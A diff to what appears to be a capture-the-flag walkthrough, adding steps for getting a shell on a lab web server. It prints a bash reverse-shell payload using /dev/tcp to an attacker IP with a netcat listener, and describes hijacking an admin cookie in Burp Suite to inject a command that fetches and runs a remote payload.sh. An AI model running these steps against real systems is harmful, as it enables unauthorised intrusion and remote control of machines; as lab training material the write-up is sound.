@@ -162,4 +162,19 @@ nc -nvlp 1111
 2. The payload `/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'` is executed on the target machine. This command on the target machine opens a reverse shell, connecting back to the attacker’s machine on port 1111.
 3. The target machine connects to the attacker’s Netcat listener, establishing a reverse shell session. The attacker can now interact with the target machine’s shell through this connection.
 
-Let's continue with the situation. Be sure to not to close server1
+Let's continue with the situation. Be sure to not to close server1, it is necessary to get the payload file, server1 must be running nin the same directory as payload.sh.
+
+Go to `/dashboard` and click on "Submit" cathing the traffic with Burp-suite. Insert admin cookie to get privileges and the command that will fetch the payload created and run it.
+
+(pic17)
+
+You will see the following outcome in server1 and your netcat listener:
+
+(pic18)
+(pic19)
+
+This means that you accessed the webserver shell. Playing around (moving through folders) you can get the file `user.txt` where the flag is located.
+
+#### Root flag
+
+Now is the time to get the `root flag`.
